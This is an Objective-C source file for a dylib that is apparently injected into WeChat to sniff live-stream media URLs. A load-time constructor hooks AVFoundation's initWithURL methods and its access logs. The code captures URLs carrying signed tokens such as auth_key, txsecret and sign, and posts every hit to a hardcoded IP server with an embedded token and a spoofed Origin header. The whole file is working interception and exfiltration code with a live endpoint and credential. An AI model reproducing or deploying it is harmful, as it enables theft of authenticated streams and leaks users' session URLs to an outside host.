
//
// ALIWeChatSniffer_NativeOnly.m
// Native-only sniffer: AV AccessLog + safe delayed AV swizzle (initWithURL hooks) -- no JS injection.
// Designed to avoid WK/WebKit dependency and related injection crashes.
//
// Build flags: -framework AVFoundation -framework UIKit -framework Foundation
//

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <AVFoundation/AVFoundation.h>
#import <objc/runtime.h>
#import <objc/message.h> // for objc_msgSend

#pragma mark - 配置

static NSString * const kPushHost  = @"http://139.155.57.242:8088";
static NSString * const kPushToken = @"@Yy166431";
static inline NSArray<NSString*> *kPushPaths(void){ return @[@"/api/push_raw", @"/api/push_form", @"/push", @"/push_raw"]; }

static const NSTimeInterval kDedupeWindow       = 60.0;
static const NSTimeInterval kBootGateDelay      = 1.5;

static const BOOL kPopupOnHit    = YES;
static const BOOL kCopyOnHit     = YES;
static const BOOL kForceUploadAll= YES;

#ifndef DEBUG_LOG
#define DEBUG_LOG 0
#endif
#if DEBUG_LOG
#define LOG(fmt, ...) NSLog((@"[ALI-NATIVE] " fmt), ##__VA_ARGS__)
#else
#define LOG(...)
#endif

#pragma mark - 前向声明

static void start_if_needed(void);
static void installAVObservers(void);
static void install_av_swizzles_safe(void);
static void handleCapturedURL(NSString *url, NSString *from);
static void postText(NSString *text);
static NSString *jsonStringify(NSDictionary *obj);

#pragma mark - 全局

static dispatch_queue_t gq;
static NSMutableDictionary<NSString*, NSDate*> *g_seen;
static id g_accessLogToken1 = nil, g_accessLogToken2 = nil;
static BOOL g_started = NO;
static BOOL g_av_swizzled = NO;

#pragma mark - 工具/判定

static inline void on_main(void(^blk)(void)){
    if (!blk) return;
    if (NSThread.isMainThread) blk(); else dispatch_async(dispatch_get_main_queue(), blk);
}
static BOOL looksLikeStream(NSString *u){
    if (!u) return NO;
    NSString *s = u.lowercaseString;
    if ([s containsString:@".m3u8"]||[s containsString:@".flv"]||[s containsString:@".mp4"]||
        [s containsString:@".ts"]  ||[s hasPrefix:@"rtmp://"]) return YES;
    if ([s containsString:@"auth_key="]||[s containsString:@"txsecret"]||[s containsString:@"txkey"]||
        [s containsString:@"token="]||[s containsString:@"sign="]||[s containsString:@"auth="]) return YES;
    if ([s containsString:@"phonelive"]||[s containsString:@"vzan"]||[s containsString:@"weizan"]||
        [s containsString:@"ukmdg"]||[s containsString:@"vzuk"]||[s containsString:@"wehfws"]) return YES;
    return NO;
}
static BOOL dedupe_skip(NSString *u){
    if (!u) return YES;
    __block BOOL skip = NO;
    dispatch_sync(gq, ^{
        NSDate *last = g_seen[u], *now = [NSDate date];
        if (last && [now timeIntervalSinceDate:last] < kDedupeWindow) skip = YES;
        else { g_seen[u] = now; skip = NO; }
    });
    return skip;
}

#pragma mark - Banner 提示（尽量兼容）

static UIWindow *ALI_BannerWin;
static UILabel  *ALI_BannerLab;
static dispatch_source_t ALI_BannerTimer;

static void ali_banner_show(NSString *text){
    if (!text.length) return;
    on_main(^{
        @try{
            if (!ALI_BannerWin){
                ALI_BannerWin = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
                ALI_BannerWin.windowLevel = UIWindowLevelStatusBar + 10;
                ALI_BannerWin.backgroundColor = [UIColor clearColor];
                ALI_BannerWin.hidden = NO;

                UIView *host = [[UIView alloc] initWithFrame:ALI_BannerWin.bounds];
                host.userInteractionEnabled = NO;
                [ALI_BannerWin addSubview:host];

                CGFloat W = MIN([UIScreen mainScreen].bounds.size.width, [UIScreen mainScreen].bounds.size.height) - 32.0;
                ALI_BannerLab = [[UILabel alloc] initWithFrame:CGRectMake((host.bounds.size.width-W)/2.0, 48.0, W, 1)];
                ALI_BannerLab.numberOfLines = 0;
                ALI_BannerLab.textAlignment = NSTextAlignmentCenter;
                ALI_BannerLab.textColor = [UIColor whiteColor];
                ALI_BannerLab.backgroundColor = [[UIColor blackColor] colorWithAlphaComponent:0.85];
                ALI_BannerLab.layer.cornerRadius = 12.0;
                ALI_BannerLab.layer.masksToBounds = YES;
                ALI_BannerLab.font = [UIFont systemFontOfSize:13 weight:UIFontWeightSemibold];
                [host addSubview:ALI_BannerLab];
            }

            ALI_BannerLab.text = text;
            CGFloat maxW = ALI_BannerLab.frame.size.width - 24.0;
            CGSize sz = [ALI_BannerLab sizeThatFits:CGSizeMake(maxW, CGFLOAT_MAX)];
            CGRect f  = ALI_BannerLab.frame; f.size.height = sz.height + 16.0; ALI_BannerLab.frame = f;

            ALI_BannerWin.alpha = 0.0; ALI_BannerWin.hidden = NO;
            [UIView animateWithDuration:0.18 animations:^{ ALI_BannerWin.alpha = 1.0; }];

            if (ALI_BannerTimer){ dispatch_source_cancel(ALI_BannerTimer); ALI_BannerTimer = nil; }
            ALI_BannerTimer = dispatch_source_create(DISPATCH_SOURCE_TYPE_TIMER, 0, 0, dispatch_get_main_queue());
            dispatch_source_set_timer(ALI_BannerTimer, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.6*NSEC_PER_SEC)), DISPATCH_TIME_FOREVER, 0);
            dispatch_source_set_event_handler(ALI_BannerTimer, ^{
                [UIView animateWithDuration:0.18 animations:^{ ALI_BannerWin.alpha = 0.0; }
                                 completion:^(__unused BOOL fin){ ALI_BannerWin.hidden = YES; }];
                dispatch_source_cancel(ALI_BannerTimer); ALI_BannerTimer = nil;
            });
            dispatch_resume(ALI_BannerTimer);
        }@catch(__unused NSException *e){}
    });
}

static void popup_safe(NSString *title, NSString *msg, NSString *copyText){
    (void)title;
    if (copyText.length) on_main(^{ @try{ UIPasteboard.generalPasteboard.string = copyText; }@catch(__unused NSException *e){} });
    ali_banner_show(msg.length ? msg : title);
}

#pragma mark - 上报

static void _ali_post_chain(NSArray<NSString*> *paths, NSUInteger idx, NSData *body){
    if (idx >= paths.count) return;
    NSString *url = [kPushHost stringByAppendingString:paths[idx]];
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:url]];
    req.HTTPMethod = @"POST";
    [req setValue:@"text/plain; charset=utf-8" forHTTPHeaderField:@"Content-Type"];
    [req setValue:kPushToken forHTTPHeaderField:@"X-Token"];
    [req setValue:@"https://app.kuniunet.com/" forHTTPHeaderField:@"Origin"];
    req.HTTPBody = body;
    [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(__unused NSData *d, NSURLResponse *r, NSError *e){
        NSInteger sc = [r isKindOfClass:[NSHTTPURLResponse class]] ? ((NSHTTPURLResponse*)r).statusCode : -1;
        if (e || sc < 200 || sc >= 300) _ali_post_chain(paths, idx+1, body);
    }] resume];
}
static void postText(NSString *text){
    if (!text) return;
    _ali_post_chain(kPushPaths(), 0, [text dataUsingEncoding:NSUTF8StringEncoding]);
}
static NSString *jsonStringify(NSDictionary *obj){
    if (!obj) return nil;
    NSData *d = [NSJSONSerialization dataWithJSONObject:obj options:0 error:nil];
    return d ? [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding] : nil;
}

#pragma mark - 事件处理

static void handleCapturedURL(NSString *url, NSString *from){
    if (!url) return;
    if (dedupe_skip(url)) return;

    NSDictionary *evt = @{@"type": @"NATIVE_HIT",
                          @"from": from ?: @"native",
                          @"url": url,
                          @"ts": @([[NSDate date] timeIntervalSince1970]*1000)};
    NSString *s = jsonStringify(evt); if (s) postText(s);

    if (looksLikeStream(url)){
        if (kCopyOnHit) on_main(^{ UIPasteboard.generalPasteboard.string = url; });
        if (kPopupOnHit) popup_safe(@"捕获播放 URL", [NSString stringWithFormat:@"%@\n%@", from?:@"native", url], url);
    }
}

#pragma mark - AV AccessLog（适配原生播放器）

static void installAVObservers(void){
    @try{
        NSNotificationCenter *nc = [NSNotificationCenter defaultCenter];
        if (!g_accessLogToken1){
            g_accessLogToken1 = [nc addObserverForName:AVPlayerItemNewAccessLogEntryNotification object:nil queue:nil usingBlock:^(NSNotification *note){
                @try{
                    id item = note.object; if (!item) return;
                    if ([item respondsToSelector:@selector(accessLog)]) {
                        id log = [item accessLog];
                        if (log && [log respondsToSelector:@selector(events)]) {
                            id ev = [log events].lastObject;
                            SEL sel = NSSelectorFromString(@"URI");
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
                            if (ev && [ev respondsToSelector:sel]) {
                                NSString *uri = [ev performSelector:sel];
                                if (uri.length) dispatch_async(gq, ^{ handleCapturedURL(uri, @"AVAccessLog"); });
                            }
#pragma clang diagnostic pop
                        }
                    }
                }@catch(__unused NSException *e){}
            }];
        }
        if (!g_accessLogToken2){
            g_accessLogToken2 = [nc addObserverForName:AVPlayerItemNewErrorLogEntryNotification object:nil queue:nil usingBlock:^(NSNotification *note){
                @try{
                    id item = note.object; if (!item) return;
                    if ([item respondsToSelector:@selector(errorLog)]) {
                        id log = [item errorLog];
                        if (log && [log respondsToSelector:@selector(events)]) {
                            for (id ev in [log events]){
                                SEL sel2 = NSSelectorFromString(@"URI");
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
                                if (ev && [ev respondsToSelector:sel2]) {
                                    NSString *uri2 = [ev performSelector:sel2];
                                    if (uri2.length) dispatch_async(gq, ^{ handleCapturedURL(uri2, @"AVErrorLog"); });
                                }
#pragma clang diagnostic pop
                            }
                        }
                    }
                }@catch(__unused NSException *e){}
            }];
        }
    }@catch(__unused NSException *e){}
}

#pragma mark - AV Swizzle: initWithURL hooks (safe delayed install)

static id (*orig_AVURLAsset_initWithURL_options)(id, SEL, NSURL*, NSDictionary*) = NULL;
static id (*orig_AVPlayerItem_initWithURL)(id, SEL, NSURL*) = NULL;

static id replaced_AVURLAsset_initWithURL_options(id self, SEL _cmd, NSURL *URL, NSDictionary *options){
    @try{
        if (URL && URL.absoluteString) dispatch_async(gq, ^{ handleCapturedURL(URL.absoluteString, @"AVURLAsset(swizzle)"); });
    }@catch(__unused NSException *e){}
    if (orig_AVURLAsset_initWithURL_options) return orig_AVURLAsset_initWithURL_options(self, _cmd, URL, options);
    return ((id (*)(id, SEL, NSURL*, NSDictionary*))objc_msgSend)(self, _cmd, URL, options);
}

static id replaced_AVPlayerItem_initWithURL(id self, SEL _cmd, NSURL *URL){
    @try{
        if (URL && URL.absoluteString) dispatch_async(gq, ^{ handleCapturedURL(URL.absoluteString, @"AVPlayerItem(swizzle)"); });
    }@catch(__unused NSException *e){}
    if (orig_AVPlayerItem_initWithURL) return orig_AVPlayerItem_initWithURL(self, _cmd, URL);
    return ((id (*)(id, SEL, NSURL*))objc_msgSend)(self, _cmd, URL);
}

static void install_av_swizzles_safe(void){
    @try{
        if (g_av_swizzled) return;
        Class avAssetClass = NSClassFromString(@"AVURLAsset");
        Class avPlayerItemClass = NSClassFromString(@"AVPlayerItem");
        if (!avAssetClass && !avPlayerItemClass) return;

        if (avAssetClass){
            SEL sel = @selector(initWithURL:options:);
            Method m = class_getInstanceMethod(avAssetClass, sel);
            if (m){
                IMP cur = method_getImplementation(m);
                orig_AVURLAsset_initWithURL_options = (void *)cur;
                method_setImplementation(m, (IMP)replaced_AVURLAsset_initWithURL_options);
                LOG(@"[ALI] installed swizzle for AVURLAsset initWithURL:options:");
            }
        }
        if (avPlayerItemClass){
            SEL sel2 = @selector(initWithURL:);
            Method m2 = class_getInstanceMethod(avPlayerItemClass, sel2);
            if (m2){
                IMP cur2 = method_getImplementation(m2);
                orig_AVPlayerItem_initWithURL = (void *)cur2;
                method_setImplementation(m2, (IMP)replaced_AVPlayerItem_initWithURL);
                LOG(@"[ALI] installed swizzle for AVPlayerItem initWithURL:");
            }
        }

        g_av_swizzled = YES;
        NSDictionary *evt = @{@"type": @"AV_SWIZZLES_INSTALLED", @"ts": @([[NSDate date] timeIntervalSince1970]*1000)};
        NSString *s = jsonStringify(evt); if (s) postText(s);
    }@catch(__unused NSException *e){
        LOG(@"[ALI] install_av_swizzles_safe error: %@", e);
    }
}

#pragma mark - 启动闸门

static void start_if_needed(void){
    if (g_started) return; g_started = YES;
    on_main(^{
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kBootGateDelay*NSEC_PER_SEC)),
                       dispatch_get_main_queue(), ^{
            installAVObservers(); // accessLog listeners
            // Install swizzles immediately (no JS dependency)
            dispatch_async(gq, ^{ install_av_swizzles_safe(); });

            NSDictionary *evt = @{@"type": @"LOADER_INIT_NATIVE", @"app": @"WeChat", @"ts": @([[NSDate date] timeIntervalSince1970]*1000)};
            NSString *s = jsonStringify(evt); if (s) postText(s);
            ali_banner_show(@"AliSniffer(native) 已就绪（进入直播/回放将尝试抓流）");
        });
    });
}

__attribute__((constructor))
static void ALIWeChatSniffer_NativeOnly_Init(void){
    if (!gq)    gq    = dispatch_queue_create("com.ali.wechat.nativeonly", DISPATCH_QUEUE_SERIAL);
    if (!g_seen) g_seen = [NSMutableDictionary dictionary];

    NSNotificationCenter *nc = [NSNotificationCenter defaultCenter];

    [nc addObserverForName:UIApplicationDidBecomeActiveNotification object:nil queue:nil usingBlock:^(__unused NSNotification *n){ start_if_needed(); }];
    [nc addObserverForName:UIApplicationDidFinishLaunchingNotification object:nil queue:nil usingBlock:^(__unused NSNotification *n){ start_if_needed(); }];

    if (NSClassFromString(@"UIScene")){
        [nc addObserverForName:@"UISceneDidActivateNotification" object:nil queue:nil usingBlock:^(__unused NSNotification *n){ start_if_needed(); }];
        [nc addObserverForName:@"UISceneWillEnterForegroundNotification" object:nil queue:nil usingBlock:^(__unused NSNotification *n){ start_if_needed(); }];
    }
}
